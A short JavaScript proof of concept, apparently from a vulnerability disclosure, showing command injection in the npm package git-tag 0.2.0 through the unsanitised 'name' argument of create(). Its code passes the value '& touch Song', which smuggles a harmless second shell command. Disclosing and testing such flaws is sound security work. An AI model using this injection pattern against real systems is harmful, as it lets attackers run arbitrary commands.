/**
 * git-tag@0.2.0 is vulnerable to command injection.
 * there are several injection points in index file (index.js) of the package.
 * for example, one injection point is located in line 61 in function create.
 * the first argument "name" can be controlled by users without any sanitization.
 */

var gitTag = require('git-tag')({localOnly:true,dir:'./'})
gitTag.create('& touch Song', '',function(){});
